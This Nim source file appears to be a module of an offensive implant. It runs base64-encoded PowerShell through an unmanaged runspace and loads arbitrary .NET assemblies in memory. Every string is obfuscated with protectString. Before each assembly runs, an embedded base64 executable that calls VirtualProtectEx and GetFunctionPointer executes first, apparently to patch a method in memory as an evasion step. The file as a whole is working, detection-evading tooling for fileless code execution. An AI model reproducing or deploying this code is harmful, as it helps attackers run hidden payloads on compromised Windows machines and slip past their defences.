import std/[strutils]
import winim/[clr]
import nimprotect


var Automation = load(protectString("System.Management.Automation"))
var RunspaceFactory = Automation.GetType(protectString("System.Management.Automation.Runspaces.RunspaceFactory"))


proc execute_encoded_powershell*(encoded_command: string): string =
    var output: string
    var runspace = @RunspaceFactory.CreateRunspace()
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(protectString("iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('") & encoded_command & "')))")
    pipeline.Commands.Add(protectString("Out-String"))
    var results = pipeline.Invoke()
    for i in countUp(0, results.Count()-1):
        output.add($results.Item(i))
    runspace.Close()
    return output.replace("\c", "")


proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, string) =
    var is_success: bool
    var output = "\n"
    try:
        var runspace = @RunspaceFactory.CreateRunspace()
        runspace.Open()
        var pipeline = runspace.CreatePipeline()
        pipeline.Commands.AddScript(protectString("""
        $assembly_bytes = [System.Convert]::FromBase64String("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aW4ALmN0b3IAQmFzZUFkZHJlc3MAQWxsb2NhdGlvbkJhc2UAQWxsb2NhdGlvblByb3RlY3QAUmVnaW9uU2l6ZQBTdGF0ZQBQcm90ZWN0AFR5cGUAaFByb2Nlc3MAbHBBZGRyZXNzAGxwQnVmZmVyAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBPdXRBdHRyaWJ1dGUAZHdMZW5ndGgAZHdTaXplAGZsTmV3UHJvdGVjdABscGZsT2xkUHJvdGVjdABhcmdzAFN5c3RlbS5TZWN1cml0eS5QZXJtaXNzaW9ucwBTZWN1cml0eVBlcm1pc3Npb25BdHRyaWJ1dGUAU2VjdXJpdHlBY3Rpb24AU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHRlc3QyAERsbEltcG9ydEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAU3lzdGVtLlJlZmxlY3Rpb24ATWV0aG9kSW5mbwA8TWFpbj5iX18wAG1pAFByZWRpY2F0ZWAxAENTJDw+OV9fQ2FjaGVkQW5vbnltb3VzTWV0aG9kRGVsZWdhdGUxAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAE1lbWJlckluZm8AZ2V0X05hbWUAU3RyaW5nAG9wX0VxdWFsaXR5AEVudmlyb25tZW50AFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAEJpbmRpbmdGbGFncwBHZXRNZXRob2RzAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAExpc3RgMQBJRW51bWVyYWJsZWAxAEZpbmQATWV0aG9kQmFzZQBSdW50aW1lTWV0aG9kSGFuZGxlAGdldF9NZXRob2RIYW5kbGUAUnVudGltZUhlbHBlcnMAUHJlcGFyZU1ldGhvZABHZXRGdW5jdGlvblBvaW50ZXIASW50UHRyAG9wX0V4cGxpY2l0AE1hcnNoYWwAU2l6ZU9mAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAFN5c3RlbS5TZWN1cml0eQBVbnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAA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
        $assembly = [Reflection.Assembly]::Load($assembly_bytes)
        $assembly.EntryPoint.invoke($null, @(,[string[]]@()))
        """) & protectString("""
        $assembly_b64 = """") & assembly_b64 & protectString(""""
        $assembly_args = """") & assembly_args & protectString(""""
        $assembly_bytes = [System.Convert]::FromBase64String($assembly_b64)
        $assembly = [Reflection.Assembly]::Load($assembly_bytes)
        $params = @(,[String[]]$assembly_args.Split(" "))
        $Writer = [System.IO.StringWriter]::new()
        $Writer.flush()
        $OriginalOut = [System.Console]::Out
        [System.Console]::SetOut($Writer)
        $assembly.EntryPoint.invoke($null, $params)
        $Writer.GetStringBuilder().ToString()
        """))
        pipeline.Commands.Add(protectString("Out-String"))
        var results = pipeline.Invoke()
        for i in countUp(0, results.Count()-1):
            output.add($results.Item(i))
        runspace.Close()
        is_success = true
    except:
        is_success = false
    return (is_success, output.replace("\c", ""))
